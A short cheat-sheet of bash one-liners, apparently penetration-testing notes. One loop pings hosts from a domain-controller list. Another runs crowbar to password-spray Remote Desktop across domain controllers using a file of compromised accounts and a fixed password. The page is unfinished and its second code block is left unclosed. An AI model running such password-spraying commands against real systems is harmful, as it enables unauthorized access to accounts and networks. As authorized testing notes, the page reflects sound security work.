# List Short Bash Scripts
Sample of Bash scripts

The below bash oneliner script reads each line of text file and ping echo, and return the line with success PING and show IP address.  
```bash
while IFS= read -r line; do ping -c 1 $line; done <list-domain-controllers.txt | grep 'PING'
```

Using crowbar to spray passowrd with list of accounts and validate if any user in list have access to Remote Desktop.  
```bash
while IFS= read -r line; do crowbar -b rdp -U owned-useraccounts.txt -c 'password' -s $line; done <list-dc-ip.txt

More bash scripts too follow    
